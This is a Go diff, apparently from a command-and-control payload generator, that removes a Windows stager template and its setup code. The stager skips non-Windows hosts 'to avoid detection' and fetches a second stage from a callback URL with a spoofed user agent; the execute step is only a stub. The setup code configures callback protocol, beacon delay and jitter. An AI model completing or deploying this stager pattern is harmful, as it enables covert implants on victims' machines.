@@ -3,7 +3,6 @@ package payload
 import (
 	"bytes"
 	"compress/gzip"
-	"encoding/json"
 	"fmt"
 	"os"
 	"os/exec"
@@ -632,110 +631,5 @@ func beacon() {
 	}
 	
 	return buf.String(), nil
-}
-	} else {
-		// Stager template
-		template = `package main
-
-import (
-	"net/http"
-	"time"
-	"os"
-	"runtime"
-)
-
-const (
-	callbackURL = "%s"
-	userAgent   = "%s"
-)
-
-func main() {
-	// Avoid detection
-	if runtime.GOOS != "windows" {
-		os.Exit(1)
-	}
-	
-	// Download and execute second stage
-	downloadAndExecute()
-}
-
-func downloadAndExecute() {
-	client := &http.Client{
-		Timeout: 30 * time.Second,
-	}
-	
-	req, err := http.NewRequest("GET", callbackURL+"/stage2", nil)
-	if err != nil {
-		return
-	}
-	
-	req.Header.Set("User-Agent", userAgent)
-	
-	resp, err := client.Do(req)
-	if err != nil {
-		return
-	}
-	defer resp.Body.Close()
-	
-	if resp.StatusCode == 200 {
-		// In a real implementation, this would download and execute second stage
-		// For now, just acknowledge receipt
-		_ = resp // Use response
-	}
-}
-`
-	}
-	
-	// Format callback URL
-	callbackURL := opts.CallbackURL
-	if callbackURL == "" {
-		// Fallback to config or default
-		if opts.Config != nil && opts.Config.Communication.Protocol != "" {
-			callbackURL = opts.Config.Communication.Protocol
-		} else {
-			callbackURL = "http://localhost:8443"
-		}
-	}
-	
-	// Ensure URL has protocol
-	if !strings.HasPrefix(callbackURL, "http://") && !strings.HasPrefix(callbackURL, "https://") {
-		// Auto-detect protocol or use configured one
-		if opts.Protocol == "https" || opts.Protocol == "mtls" {
-			callbackURL = "https://" + callbackURL
-		} else {
-			callbackURL = "http://" + callbackURL
-		}
-	}
-	
-	// Set delay and jitter defaults
-	delay := opts.Delay
-	if delay == 0 {
-		delay = 30 // Default 30 seconds
-	}
-	jitter := opts.Jitter
-	if jitter < 0 {
-		jitter = 0
-	}
-	if jitter > 1.0 {
-		jitter = 1.0
-	}
-	
-	// Set user agent
-	userAgent := opts.UserAgent
-	if userAgent == "" {
-		userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-	}
-	
-	var source string
-	if opts.Type == "full" {
-		source, err = g.generateWindowsSourceFull(opts)
-	} else {
-		// Stager only needs callbackURL and userAgent
-		source = fmt.Sprintf(template, callbackURL, userAgent)
-	}
-	if err != nil {
-		return nil, err
-	}
-	return []byte(source), nil
 }
 
